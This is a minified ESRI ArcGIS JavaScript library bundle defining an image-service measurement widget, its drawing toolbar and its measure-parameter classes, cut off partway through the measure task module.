// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"esri/dijit/ImageServiceMeasure":function(){define("dojo/_base/declare dojo/_base/lang dojo/i18n!../nls/jsapi dojo/text!./templates/ImageServiceMeasure.html dojo/has dojo/on ../kernel dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin ../toolbars/ImageServiceMeasureTool dijit/form/DropDownButton dijit/DropDownMenu dijit/MenuItem dijit/MenuSeparator dijit/PopupMenuItem dijit/RadioMenuItem dijit/CheckedMenuItem ../symbols/SimpleMarkerSymbol ../symbols/SimpleLineSymbol ../symbols/SimpleFillSymbol ../graphic ../InfoTemplate ../geometry/Point dojo/_base/Color dojo/dom-class dojo/_base/array ../tasks/ImageServiceMeasureParameters ../units dojo/dom-construct dijit/form/ToggleButton dojo/html dojo/number".split(" "),
function(e,d,k,g,p,h,t,n,D,w,y,z,u,x,l,B,c,f,I,E,H,J,K,L,F,m,q,v,r,A,M,G,C){g=e([n,D,w],{declaredClass:"esri.dijit.ImageServiceMeasure",templateString:g,widgetsInTemplate:!0,layer:null,map:null,layout:"dropDown",displayOperations:null,markerSymbol:null,lineSymbol:null,fillSymbol:null,displayMeasureResultInPopup:null,angularUnit:null,linearUnit:null,areaUnit:null,_supportedMeasureOperations:[],_supportedUnits:{},_currentGraphic:null,_defaultUnits:{angularUnit:"DECIMAL_DEGREES",linearUnit:"METERS",
areaUnit:"SQUARE_METERS"},_desiredDropDownOrder:"OPERATION_POINT OPERATION_DISTANCE_ANGLE OPERATION_AREA_PERIMETER OPERATION_CENTROID OPERATION_BASE_TOP OPERATION_TOP_TOP_SHADOW OPERATION_BASE_TOP_SHADOW".split(" "),_map3DOperations:{OPERATION_POINT:"OPERATION_POINT_3D",OPERATION_DISTANCE_ANGLE:"OPERATION_DISTANCE_ANGLE_3D",OPERATION_AREA_PERIMETER:"OPERATION_AREA_PERIMETER_3D",OPERATION_CENTROID:"OPERATION_CENTROID_3D",OPERATION_BASE_TOP:"OPERATION_BASE_TOP",OPERATION_TOP_TOP_SHADOW:"OPERATION_TOP_TOP_SHADOW",
OPERATION_BASE_TOP_SHADOW:"OPERATION_BASE_TOP_SHADOW"},_menu:null,_dropDownButton:null,_currentOperation:null,_activeMeasureOpMenuItem:null,_has3DOperations:!1,_enabled3DCheckbox:!1,_dropDownMenuItemMap:{},_toggleButtonMenuItemMap:{},_decimalDegreesConstantValue:"esriDUDecimalDegrees",_decimalDegreesConstantKeyword:"DECIMAL_DEGREES",constructor:function(a){e.safeMixin(this,a);this._setDefaultSymbols();this._i18n=k},startup:function(){this.inherited(arguments)},postCreate:function(){this.map&&this.layer&&
(this.measureToolbar=new y({map:this.map,layer:this.layer}),this.measureToolbar.on("draw-end",d.hitch(this,this._addGraphic)),this.measureToolbar.on("draw-start",d.hitch(this,this._onDrawStart)),this.measureToolbar.on("measure-end",d.hitch(this,this._addInfoWindow)),this.measureToolbar.on("unit-change",d.hitch(this,this._onUnitChange)),h(this.layer,"spatial-reference-change",d.hitch(this,this._removeDraws)),this._supportedMeasureOperations=this._getSupportedMeasureOperations(),this._has3DOperations=
this._check3DSupported(),this._reorderMeasureOperations(),this._supportedUnits=this._getSupportedUnits(),this._setDefaultUnits());this._checkValidLayoutValue();0<this._supportedMeasureOperations.length?"dropDown"===this.layout?this._populateMeasureDropdown():"toolbar"===this.layout&&this._populateMeasureButtons():G.set(this.esriImageServiceMeasure,this._i18n.widgets.imageServiceMeasure.mensurationCapabilitiesAbsentText)},_checkValidLayoutValue:function(){"dropdown"===this.layout.toLowerCase()?this.layout=
"dropDown":"toolbar"===this.layout.toLowerCase()?this.layout="toolbar":(this.layout="dropDown",console.log("Invalid value for layout"))},_getUnitKeyword:function(a){var b=null,c;if(a===this._decimalDegreesConstantValue)b=this._decimalDegreesConstantKeyword;else for(c in r)r.hasOwnProperty(c)&&r[c]===a&&(b=c);return b||null},_setUnitKeyword:function(a,b){var c;this[a]?(c=this._getUnitKeyword(this[a]))?a=c:(a=this._defaultUnits[a],console.log("Incorrect "+b+" supplied. "+b+" set to default.")):a=this._defaultUnits[a];
return a},_setDefaultUnits:function(){this.linearUnit=this._setUnitKeyword("linearUnit","Linear Unit");this.areaUnit=this._setUnitKeyword("areaUnit","Area Unit");this.angularUnit=this._setUnitKeyword("angularUnit","Angular Unit");this.measureToolbar.setLinearUnit(r[this.linearUnit]);this.measureToolbar.setAreaUnit(r[this.areaUnit]);this.measureToolbar.setAngularUnit(r[this.angularUnit])},_getSupportedMeasureOperations:function(){var a=[],b=this.displayOperations||this.measureToolbar.getSupportedMeasureOperations(),
c=this.measureToolbar.getSupportedMeasureOperations(),d;q.forEach(b,function(b){for(d in v)v.hasOwnProperty(d)&&v[d]===b&&(-1<q.indexOf(c,b)?a.push(d):console.log(b+" is not supported by the service."))},this);return a},_getSupportedUnits:function(){var a={},b=[],c=[],d=this.measureToolbar.getSupportedUnits(),f;for(f in d)d.hasOwnProperty(f)&&(c=d[f],b=[],q.forEach(c,function(a){b.push(this._getUnitString(a))},this),a[f]=b);return a},_check3DSupported:function(){return this._isSupportedMeasureOperation("OPERATION_POINT_3D")||
this._isSupportedMeasureOperation("OPERATION_DISTANCE_ANGLE_3D")||this._isSupportedMeasureOperation("OPERATION_AREA_PERIMETER_3D")||this._isSupportedMeasureOperation("OPERATION_CENTROID_3D")},_isSupportedMeasureOperation:function(a){return-1<this._supportedMeasureOperations.indexOf(a)},_reorderMeasureOperations:function(){var a=[];q.forEach(this._desiredDropDownOrder,function(b){-1<this._supportedMeasureOperations.indexOf(b)&&a.push(b)},this);this._supportedMeasureOperations=a},_setDefaultSymbols:function(){this.markerSymbol||
(this.markerSymbol=new I,this.markerSymbol.setPath("M16,4.938c-7.732,0-14,4.701-14,10.5c0,1.981,0.741,3.833,2.016,5.414L2,25.272l5.613-1.44c2.339,1.316,5.237,2.106,8.387,2.106c7.732,0,14-4.701,14-10.5S23.732,4.938,16,4.938zM16.868,21.375h-1.969v-1.889h1.969V21.375zM16.772,18.094h-1.777l-0.176-8.083h2.113L16.772,18.094z"),this.markerSymbol.setColor(new F("#00FFFF")));this.lineSymbol||(this.lineSymbol=new E(E.STYLE_SOLID,new F([255,0,0]),1.5));this.fillSymbol||(this.fillSymbol=new H(H.STYLE_SOLID,new E(E.STYLE_DASHDOT,
new F([255,0,0]),2),new F([255,255,0,.25])))},_populateMeasureDropdown:function(){var a,b;this._menu=new u;q.forEach(this._supportedMeasureOperations,function(b){a=new x({label:this._i18n.widgets.imageServiceMeasure.operationLabel[b],iconClass:v[b]});a.on("click",d.hitch(this,this._onDropDownMenuItemClick,b,a));this._menu.addChild(a);this._dropDownMenuItemMap[b]=a},this);b=new l;this._menu.addChild(b);this._has3DOperations&&(b=new f({label:this._i18n.widgets.imageServiceMeasure.measure3DLabel,checked:!1}),
b.on("change",d.hitch(this,this._on3DCheckBoxChange)),this._menu.addChild(b),b=new l,this._menu.addChild(b));this._addUnitsMenu();this._dropDownButton=new z({dropDown:this._menu,"class":"esriImageServiceMeasureDropdownContainer"},this.measureDropDownContainer);this._dropDownButton.startup();this._currentOperation=this._defaultOperation=this._supportedMeasureOperations[0];this._toggleButton=new z({label:this._i18n.widgets.imageServiceMeasure.operationLabel[this._defaultOperation],iconClass:v[this._defaultOperation],
"class":"esriImageServiceMeasureToggleButton",dropDown:new u({"class":"esriHiddenDropDownMenu"})},this.toggleButtonDiv);this._toggleButton._buttonNode.title=this._i18n.widgets.imageServiceMeasure.operationLabel[this._defaultOperation];this._toggleButton.startup();this._toggleButton.on("click",d.hitch(this,this._toggle))},_populateMeasureButtons:function(){var a,b,c;m.add(this.esriImageServiceMeasure,"esriImageServiceMeasureToolbarLayout");m.add(this.measureButtonContainer,"esriImageServiceMeasureButtonContainer");
this._menu=new u;q.forEach(this._supportedMeasureOperations,function(b){c=A.create("div",{innerHTML:this._i18n.widgets.imageServiceMeasure.operationLabel[b]},this.measureButtonContainer);a=new M({showLabel:!1,checked:!1,label:this._i18n.widgets.imageServiceMeasure.operationLabel[b],iconClass:v[b],baseClass:"esriMeasureButton"},c);a.on("click",d.hitch(this,this._onButtonMenuItemClick,b));this._toggleButtonMenuItemMap[b]=a},this);this._has3DOperations&&(b=new f({label:this._i18n.widgets.imageServiceMeasure.measure3DLabel,
checked:!1}),b.on("change",d.hitch(this,this._on3DCheckBoxToolbarLayoutChange)),this._menu.addChild(b),b=new l,this._menu.addChild(b));this._addUnitsMenu();b=A.create("span",{innerHTML:"|"},this.measureButtonContainer);c=A.create("div",null,this.measureButtonContainer);this._dropDownButton=new z({dropDown:this._menu,label:this._i18n.widgets.imageServiceMeasure.settings,showLabel:!1,iconClass:"esriMensurationSettingsIcon","class":"esriMeasureSettingsButton"},c);this._dropDownButton.startup();"false"!==
this.displayMeasureResultInPopup&&!1!==this.displayMeasureResultInPopup&&this.displayMeasureResultInPopup||(this.measureResultContainer=A.create("div",{"class":"measureResultContainer"},this.esriImageServiceMeasure),this.esriMeasurementResultLabel=A.create("div",{innerHTML:this._i18n.widgets.imageServiceMeasure.infoWindowTitle,"class":"esriMeasurementResultLabel"},this.measureResultContainer),this.measureResultStringDiv=A.create("div",{"class":"esriMeasurementResultString"},this.measureResultContainer))},
_angularUnitsReqd:function(){if(q.some(this._supportedMeasureOperations,function(a){if("OPERATION_DISTANCE_ANGLE_3D"===a||"OPERATION_DISTANCE_ANGLE"===a)return!0}))return!0},_linearUnitsReqd:function(){if(q.some(this._supportedMeasureOperations,function(a){if(0>a.indexOf("OPERATION_POINT")&&0>a.indexOf("OPERATION_CENTROID"))return!0}))return!0},_areaUnitsReqd:function(){if(q.some(this._supportedMeasureOperations,function(a){if("OPERATION_AREA_PERIMETER_3D"===a||"OPERATION_AREA_PERIMETER"===a)return!0}))return!0},
_addUnitsMenu:function(){var a,b,f;this._angularUnitsReqd()&&(this.angularUnitMenu=new u,q.forEach(this._supportedUnits.angularUnits,function(a){f=this._isCurrentAngularUnit(a);b=new c({group:"angularUnit",checked:f,label:this._i18n.widgets.imageServiceMeasure.unitLabel[a],"class":f?"esriSelectedOption":""});f&&(this._currentAngularUnitMenuItem=b);b.on("click",d.hitch(this,this._onAngularUnitClick,a,b));this.angularUnitMenu.addChild(b)},this),a=new B({label:this._i18n.widgets.imageServiceMeasure.angularUnits,
popup:this.angularUnitMenu}),this._menu.addChild(a));this._linearUnitsReqd()&&(this.linearUnitMenu=new u,q.forEach(this._supportedUnits.linearUnits,function(a){f=this._isCurrentLinearUnit(a);b=new c({group:"linearUnit",checked:f,label:this._i18n.widgets.imageServiceMeasure.unitLabel[a],"class":f?"esriSelectedOption":""});f&&(this._currentLinearUnitMenuItem=b);b.on("click",d.hitch(this,this._onLinearUnitClick,a,b));this.linearUnitMenu.addChild(b)},this),a=new B({label:this._i18n.widgets.imageServiceMeasure.linearUnits,
popup:this.linearUnitMenu}),this._menu.addChild(a));this._areaUnitsReqd()&&(this.areaUnitMenu=new u,q.forEach(this._supportedUnits.areaUnits,function(a){f=this._isCurrentAreaUnit(a);b=new c({group:"areaUnit",checked:f,label:this._i18n.widgets.imageServiceMeasure.unitLabel[a],"class":f?"esriSelectedOption":""});f&&(this._currentAreaUnitMenuItem=b);b.on("click",d.hitch(this,this._onAreaUnitClick,a,b));this.areaUnitMenu.addChild(b)},this),a=new B({label:this._i18n.widgets.imageServiceMeasure.areaUnits,
popup:this.areaUnitMenu}),this._menu.addChild(a))},_on3DCheckBoxChange:function(a){var b=this._currentOperation.replace("_3D","");this._enabled3DCheckbox=a;this._dropDownButton.openDropDown();this._activeMeasureOpMenuItem&&(this._activeMeasureOpMenuItem=null,this._onDropDownMenuItemClick(b,this._dropDownMenuItemMap[b]))},_on3DCheckBoxToolbarLayoutChange:function(a){this._enabled3DCheckbox=a;this._dropDownButton.openDropDown();this._enabled3DCheckbox||(this._currentOperation=this._currentOperation.replace("_3D",
""));this._currentOperation&&this._onButtonMenuItemClick(this._currentOperation)},_onDropDownMenuItemClick:function(a,b){var c=b.domNode;this._enabled3DCheckbox&&(a=this._map3DOperations[a]);this._disableMapNavigation();this._removeDraws();this._activeMeasureOpMenuItem?(m.remove(this._activeMeasureOpMenuItem.domNode,"esriSelectedOption"),m.add(c,"esriSelectedOption"),this._activeMeasureOpMenuItem=b,this._currentOperation=a,this._toggleButton.set({label:this._i18n.widgets.imageServiceMeasure.operationLabel[a],
iconClass:v[a.replace("_3D","")]})):(this._activeMeasureOpMenuItem=b,m.add(c,"esriSelectedOption"),this._currentOperation=a,this._toggleButton.set({label:this._i18n.widgets.imageServiceMeasure.operationLabel[a],iconClass:v[a.replace("_3D","")]}),m.add(this._toggleButton._buttonNode,"esriCheckedMeasureButton"));this._toggleButton._buttonNode.title=this._i18n.widgets.imageServiceMeasure.operationLabel[a];this.measureToolbar.activate(v[a]);this.measureToolbar.showDrawTooltip()},_uncheckOtherButtons:function(a){for(var b in this._toggleButtonMenuItemMap)this._toggleButtonMenuItemMap.hasOwnProperty(b)&&
b!==a&&(0<=q.indexOf(this._supportedMeasureOperations,b)?this._toggleButtonMenuItemMap[b].set("checked",!1):delete this._toggleButtonMenuItemMap[b])},_onButtonMenuItemClick:function(a){this._removeDraws();this._enabled3DCheckbox&&(a=this._map3DOperations[a]);this._uncheckOtherButtons(a.replace("_3D",""));this._currentOperation=a;this._toggleButtonMenuItemMap[a.replace("_3D","")].checked?(this._disableMapNavigation(),this.measureToolbar.activate(v[a]),this.measureToolbar.showDrawTooltip()):(this.measureToolbar.deactivate(),
this._enableMapNavigation());this.measureResultStringDiv&&G.set(this.measureResultStringDiv,"")},_isCurrentAngularUnit:function(a){return a===this.angularUnit?!0:!1},_isCurrentLinearUnit:function(a){return a===this.linearUnit?!0:!1},_isCurrentAreaUnit:function(a){return a===this.areaUnit?!0:!1},_onLinearUnitClick:function(a,b){m.remove(this._currentLinearUnitMenuItem.domNode,"esriSelectedOption");m.add(b.domNode,"esriSelectedOption");this._currentLinearUnitMenuItem=b;this.linearUnit=a;this.measureToolbar.setLinearUnit(r[a]);
this._dropDownButton.openDropDown()},_onAngularUnitClick:function(a,b){m.remove(this._currentAngularUnitMenuItem.domNode,"esriSelectedOption");m.add(b.domNode,"esriSelectedOption");this._currentAngularUnitMenuItem=b;this.angularUnit=a;this.measureToolbar.setAngularUnit(r[a]);this._dropDownButton.openDropDown()},_onAreaUnitClick:function(a,b){m.remove(this._currentAreaUnitMenuItem.domNode,"esriSelectedOption");m.add(b.domNode,"esriSelectedOption");this._currentAreaUnitMenuItem=b;this.areaUnit=a;this.measureToolbar.setAreaUnit(r[a]);
this._dropDownButton.openDropDown()},_onDrawStart:function(){this._removeDraws()},_addGraphic:function(a){var b=a.geometry;this.measureToolbar.hideDrawTooltip();a="point"===b.type?this.markerSymbol:"line"===b.type||"polyline"===b.type?this.lineSymbol:this.fillSymbol;this._removeDraws();this._currentGraphic=a=new J(b,a);this.map.graphics.add(a)},_addInfoWindow:function(a){a=this._measureResultString(a.measureResult,a.error);"dropDown"===this.layout||"toolbar"===this.layout&&("true"===this.displayMeasureResultInPopup||
!0===this.displayMeasureResultInPopup)?this._displayInfoWindowMeasureResult(a):"toolbar"===this.layout&&this._displayToolbarMeasureResult(a)},_measureResultString:function(a,b){b="";var c,f,d,n,e;if(a)for(e in a)a.hasOwnProperty(e)&&a[e]&&"name"!==e&&"sensorName"!==e&&(n="point"===e&&0<=this._currentOperation.toLowerCase().indexOf("centroid")?this._i18n.widgets.imageServiceMeasure.measureDialog.Centroid:this._i18n.widgets.imageServiceMeasure.measureDialog[e.charAt(0).toUpperCase()+e.slice(1)],"point"!=
e?(c=this._i18n.widgets.imageServiceMeasure.unitLabel[this._getUnitString(a[e].unit)],d=Math.abs(a[e].uncertainty).toFixed(2),f=this._getDisplayValue(a[e]),b+="\x3cstrong\x3e"+n+"\x3c/strong\x3e: "+C.format(f)+" (\x26plusmn"+C.format(d)+") "+c+"\x3cbr/\x3e"):(c=a[e].value.x.toFixed(2),f=a[e].value.y.toFixed(2),b+="\x3cstrong\x3e"+n+"\x3c/strong\x3e\x3cbr/\x3e"+this._i18n.widgets.imageServiceMeasure.measureDialog.X+" : "+C.format(c)+"\x3cbr/\x3e"+this._i18n.widgets.imageServiceMeasure.measureDialog.Y+
" : "+C.format(f)+"\x3cbr/\x3e",0<=this._currentOperation.toLowerCase().indexOf("3d")&&void 0!==a[e].value.z&&(n=a[e].value.z.toFixed(2),b+=this._i18n.widgets.imageServiceMeasure.measureDialog.Z+" : "+C.format(n)+"\x3cbr/\x3e")));else b=this._i18n.widgets.imageServiceMeasure.measurementErrorGeneric;return b},_getDisplayValue:function(a){return this.layer.currentVersion&&10.3<=this.layer.currentVersion?0>a.uncertainty?a.value.toFixed(2):Number(a.displayValue).toString():a.value.toFixed(2)},_getUnitString:function(a){var b,
c;for(b in r)r.hasOwnProperty(b)&&(r[b]===a?c=b:a===this._decimalDegreesConstantValue&&(c=this._decimalDegreesConstantKeyword));return c},_displayInfoWindowMeasureResult:function(a){if(this._currentGraphic){var b=this._currentGraphic.geometry,c,f=[this._currentGraphic];this._currentGraphic&&("point"===b.type?this._currentInfowindow=b:"polyline"===b.type?(c=(b.paths[0][0][0]+b.paths[0][1][0])/2,b=(b.paths[0][0][1]+b.paths[0][1][1])/2,this._currentInfowindow=new L(c,b,this.map.spatialReference)):"polygon"===
b.type&&(this._currentInfowindow=b.getCentroid()),f[0].setInfoTemplate(new K({title:this._i18n.widgets.imageServiceMeasure.infoWindowTitle,content:a})),this.map.infoWindow.setFeatures(f),this.map.infoWindow.show(this._currentInfowindow))}},_displayToolbarMeasureResult:function(a){G.set(this.measureResultStringDiv,a)},_removeAssociatedGeometry:function(){this._currentGraphic&&(this.map.graphics.remove(this._currentGraphic),this._currentGraphic=null)},_removeDraws:function(){this._removeAssociatedGeometry();
this._currentInfowindow&&(this.map.infoWindow.hide(this._currentInfowindow),this._currentInfowindow=null)},_onUnitChange:function(a){this._addInfoWindow(a)},_toggle:function(){this._activeMeasureOpMenuItem?(this._removeDraws(),m.remove(this._activeMeasureOpMenuItem.domNode,"esriSelectedOption"),this._activeMeasureOpMenuItem=null,this.measureToolbar.deactivate(),m.remove(this._toggleButton._buttonNode,"esriCheckedMeasureButton"),this._enableMapNavigation()):(this._menuItem=this._dropDownMenuItemMap[this._currentOperation.replace("_3D",
"")],this._onDropDownMenuItemClick(this._currentOperation.replace("_3D",""),this._menuItem))},deactivate:function(){this._removeDraws();this._activeMeasureOpMenuItem&&(m.remove(this._activeMeasureOpMenuItem.domNode,"esriSelectedOption"),this._activeMeasureOpMenuItem=null);this._toggleButton&&m.remove(this._toggleButton._buttonNode,"esriCheckedMeasureButton");this.measureResultStringDiv&&G.set(this.measureResultStringDiv,"");"toolbar"===this.layout&&this._currentOperation&&this._toggleButtonMenuItemMap[this._currentOperation.replace("_3D",
"")].set("checked",!1);this.measureToolbar&&this.measureToolbar.deactivate();this._enableMapNavigation()},_disableMapNavigation:function(){this.map.disableMapNavigation();this.map.setInfoWindowOnClick(!1)},_enableMapNavigation:function(){this.map.enableMapNavigation();this.map.setInfoWindowOnClick(!0)},destroy:function(){this.inherited(arguments)}});p("extend-esri")&&d.setObject("dijit.ImageServiceMeasure",g,t);return g})},"esri/toolbars/ImageServiceMeasureTool":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/Color dojo/has ../kernel ./_toolbar ../symbols/SimpleMarkerSymbol ../symbols/SimpleLineSymbol ../symbols/SimpleFillSymbol ./draw ../tasks/ImageServiceMeasureParameters ../tasks/ImageServiceMeasureTask ../geometry/Point dojo/_base/array ../units".split(" "),
function(e,d,k,g,p,h,t,n,D,w,y,z,u,x,l){var B=e("CustomDraw",[w],{returnCurrentPoint:function(){return this._points},hideTooltip:function(){this._options.showTooltips=!1},showTooltip:function(){this._options.showTooltips=!0}});h=e(h,{declaredClass:"esri.toolbars.imageServiceMeasure",_eventMap:{"draw-end":["geometry"],"draw-start":[],"measure-end":["measureResult","error","geometry"],"unit-change":["measureResult","error","geometry"]},_mensurationCapabilitiesMap:{Basic:["OPERATION_POINT","OPERATION_DISTANCE_ANGLE",
"OPERATION_AREA_PERIMETER","OPERATION_CENTROID"],"3D":["OPERATION_POINT_3D","OPERATION_DISTANCE_ANGLE_3D","OPERATION_AREA_PERIMETER_3D","OPERATION_CENTROID_3D"],"Base-Top Height":["OPERATION_BASE_TOP"],"Top-Top Shadow Height":["OPERATION_TOP_TOP_SHADOW"],"Base-Top Shadow Height":["OPERATION_BASE_TOP_SHADOW"]},_supportedMeasureOperations:[],_operationsMap:{OPERATION_POINT:{geometryType:"POINT"},OPERATION_DISTANCE_ANGLE:{geometryType:"LINE"},OPERATION_AREA_PERIMETER:{geometryType:"POLYGON"},OPERATION_BASE_TOP:{geometryType:"LINE"},
OPERATION_BASE_TOP_SHADOW:{geometryType:"LINE"},OPERATION_TOP_TOP_SHADOW:{geometryType:"LINE"},OPERATION_CENTROID:{geometryType:"POLYGON"},OPERATION_POINT_3D:{geometryType:"POINT"},OPERATION_DISTANCE_ANGLE_3D:{geometryType:"LINE"},OPERATION_AREA_PERIMETER_3D:{geometryType:"POLYGON"},OPERATION_CENTROID_3D:{geometryType:"POLYGON"}},_supportedUnits:{linearUnits:"INCHES FEET YARDS MILES NAUTICAL_MILES MILLIMETERS CENTIMETERS DECIMETERS METERS KILOMETERS".split(" "),angularUnits:["RADIANS","DECIMAL_DEGREES"],
areaUnits:"SQUARE_INCHES SQUARE_FEET SQUARE_YARDS ACRES SQUARE_MILES SQUARE_MILLIMETERS SQUARE_CENTIMETERS SQUARE_DECIMETERS SQUARE_METERS ARES HECTARES SQUARE_KILOMETERS".split(" ")},markerSymbol:null,lineSymbol:null,fillSymbol:null,_drawToolbar:null,_currentGeometry:null,_currentOperation:null,linearUnit:null,angularUnit:null,areaUnit:null,_decimalDegreesConstantValue:"esriDUDecimalDegrees",_decimalDegreesConstantKeyword:"DECIMAL_DEGREES",constructor:function(c){e.safeMixin(this,c);this._checkMensurationSupport();
this._setDefaultSymbols()},_checkMensurationSupport:function(){this.layer.mensurationCapabilities?this._setSupportedMeasureOperations():console.log("Mensuration Capabilities not supported.")},_setDefaultSymbols:function(){this.markerSymbol||(this.markerSymbol=new t,this.markerSymbol.setPath("M16,4.938c-7.732,0-14,4.701-14,10.5c0,1.981,0.741,3.833,2.016,5.414L2,25.272l5.613-1.44c2.339,1.316,5.237,2.106,8.387,2.106c7.732,0,14-4.701,14-10.5S23.732,4.938,16,4.938zM16.868,21.375h-1.969v-1.889h1.969V21.375zM16.772,18.094h-1.777l-0.176-8.083h2.113L16.772,18.094z"),
this.markerSymbol.setColor(new k("#00FFFF")));this.lineSymbol||(this.lineSymbol=new n(n.STYLE_SOLID,new k([255,0,0]),1.5));this.fillSymbol||(this.fillSymbol=new D(D.STYLE_SOLID,new n(n.STYLE_DASHDOT,new k([255,0,0]),2),new k([255,255,0,.25])))},_setSupportedMeasureOperations:function(){var c;this._supportedMeasureOperations=[];this.mensurationCapabilities=this.layer.mensurationCapabilities.split(",");x.forEach(this.mensurationCapabilities,function(f){c=this._mensurationCapabilitiesMap[f];x.forEach(c,
function(c){this._supportedMeasureOperations.push(c)},this)},this)},getSupportedMeasureOperations:function(){var c=[];x.forEach(this._supportedMeasureOperations,function(f){c.push(y[f])},this);return c},getSupportedUnits:function(){var c={},f=[],d=[],e;for(e in this._supportedUnits)this._supportedUnits.hasOwnProperty(e)&&(f=this._supportedUnits[e],d=[],x.forEach(f,function(c){c===this._decimalDegreesConstantKeyword?d.push(this._decimalDegreesConstantValue):d.push(l[c])},this),c[e]=d);return c},setLinearUnit:function(c){for(var f in l)l.hasOwnProperty(f)&&
l[f]===c&&(this.linearUnit=f);this._currentGeometry&&this._getUnitChangeResults(this._currentGeometry)},setAngularUnit:function(c){for(var f in l)l.hasOwnProperty(f)&&(l[f]===c?this.angularUnit=f:c===this._decimalDegreesConstantValue&&(this.angularUnit=this._decimalDegreesConstantKeyword));this._currentGeometry&&this._getUnitChangeResults(this._currentGeometry)},setAreaUnit:function(c){for(var f in l)l.hasOwnProperty(f)&&l[f]===c&&(this.areaUnit=f);this._currentGeometry&&this._getUnitChangeResults(this._currentGeometry)},
setMarkerSymbol:function(c){this.markerSymbol=c},setLineSymbol:function(c){this.lineSymbol=c},setFillSymbol:function(c){this.fillSymbol=c},activate:function(c){x.forEach(this._supportedMeasureOperations,function(f){y[f]===c&&(this._currentOperation=f)},this);this.map.setMapCursor("crosshair");this._mapClickHandle=this.map.on("click",d.hitch(this,this._onMapClick));this._mapMouseDownHandle=this.map.on("mouse-down",d.hitch(this,this._onMapMouseDown));this._drawToolbar||(this._drawToolbar=new B(this.map,
{fillSymbol:this.fillSymbol,markerSymbol:this.markerSymbol,lineSymbol:this.lineSymbol}),this._drawToolbar.on("draw-end",d.hitch(this,this._setGeometry)));this._drawToolbar.activate(w[this._operationsMap[this._currentOperation].geometryType])},_onMapClick:function(){if(0===this._drawToolbar.returnCurrentPoint().length)this.onDrawStart()},_onMapMouseDown:function(){if(0===this._drawToolbar.returnCurrentPoint().length)this.onDrawStart()},deactivate:function(){this._drawToolbar&&this._drawToolbar.deactivate();
this.map.setMapCursor("default");this._currentOperation=this._currentGeometry=null;this._mapClickHandle&&(this._mapClickHandle.remove(),this._mapClickHandle=null);this._mapMouseDownHandle&&(this._mapMouseDownHandle.remove(),this._mapMouseDownHandle=null)},hideDrawTooltip:function(){this._drawToolbar.deactivate();this._drawToolbar.hideTooltip();this._drawToolbar.activate(w[this._operationsMap[this._currentOperation].geometryType])},showDrawTooltip:function(){this._drawToolbar.deactivate();this._drawToolbar.showTooltip();
this._drawToolbar.activate(w[this._operationsMap[this._currentOperation].geometryType])},_setGeometry:function(c){c=c.geometry;this.onDrawEnd(c);this._getMensurationResults(c);this._currentGeometry=c},_getImageServiceMeasureParameters:function(c){var f=new y;f.operation=y[this._currentOperation];f.mosaicRule=this.layer.mosaicRule;f.linearUnit=l[this.linearUnit];f.angularUnit=this.angularUnit===this._decimalDegreesConstantKeyword?this._decimalDegreesConstantValue:l[this.angularUnit];f.areaUnit=l[this.areaUnit];
"line"===c.type||"polyline"===c.type?(f.fromGeometry=new u(c.paths[0][0][0],c.paths[0][0][1],this.map.spatialReference),f.toGeometry=new u(c.paths[0][1][0],c.paths[0][1][1],this.map.spatialReference)):f.fromGeometry=c;return f},_getMensurationResults:function(c){c=this._getImageServiceMeasureParameters(c);(new z(this.layer.url)).execute(c,d.hitch(this,this._measureTaskSuccess),d.hitch(this,this._measureTaskError))},_measureTaskSuccess:function(c){this.onMeasureEnd(c,null,this._currentGeometry)},_measureTaskError:function(c){this.onMeasureEnd(null,
c,this._currentGeometry)},_getUnitChangeResults:function(c){c=this._getImageServiceMeasureParameters(c);(new z(this.layer.url)).execute(c,d.hitch(this,this._unitChangeSuccess),d.hitch(this,this._unitChangeError))},_unitChangeSuccess:function(c){this.onUnitChange(c,null,this._currentGeometry)},_unitChangeError:function(c){this.onUnitChange(null,c,this._currentGeometry)},onDrawStart:function(){},onDrawEnd:function(){},onMeasureEnd:function(){},onUnitChange:function(){}});g("extend-esri")&&d.setObject("toolbars.imageServiceMeasure",
h,p);return h})},"esri/tasks/ImageServiceMeasureParameters":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/json dojo/has ../kernel ../geometry/jsonUtils".split(" "),function(e,d,k,g,p,h){e=e(null,{declaredClass:"esri.tasks.ImageServiceMeasureParameters",fromGeometry:null,toGeometry:null,operation:null,pixelSize:null,mosaicRule:!1,linearUnit:null,angularUnit:null,areaUnit:null,toJson:function(d){var e=d&&d.fromGeometry||this.fromGeometry;d={fromGeometry:e,toGeometry:d&&d.toGeometry||
this.toGeometry,measureOperation:this.operation,mosaicRule:this.mosaicRule?k.toJson(this.mosaicRule.toJson()):null,linearUnit:this.linearUnit,angularUnit:this.angularUnit,areaUnit:this.areaUnit};e&&(d.geometryType=h.getJsonType(e));this.pixelSize&&(d.pixelSize=this.pixelSize?k.toJson(this.pixelSize.toJson()):null);return d}});d.mixin(e,{OPERATION_POINT:"esriMensurationPoint",OPERATION_DISTANCE_ANGLE:"esriMensurationDistanceAndAngle",OPERATION_AREA_PERIMETER:"esriMensurationAreaAndPerimeter",OPERATION_BASE_TOP:"esriMensurationHeightFromBaseAndTop",
OPERATION_BASE_TOP_SHADOW:"esriMensurationHeightFromBaseAndTopShadow",OPERATION_TOP_TOP_SHADOW:"esriMensurationHeightFromTopAndTopShadow",OPERATION_CENTROID:"esriMensurationCentroid",OPERATION_POINT_3D:"esriMensurationPoint3D",OPERATION_DISTANCE_ANGLE_3D:"esriMensurationDistanceAndAngle3D",OPERATION_AREA_PERIMETER_3D:"esriMensurationAreaAndPerimeter3D",OPERATION_CENTROID_3D:"esriMensurationCentroid3D"});g("extend-esri")&&d.setObject("tasks.ImageServiceMeasureParameters",e,p);return e})},"esri/tasks/ImageServiceMeasureTask":function(){define("dojo/_base/declare dojo/_base/lang dojo/has ../kernel ../request ../geometry/normalizeUtils ./Task".split(" "),
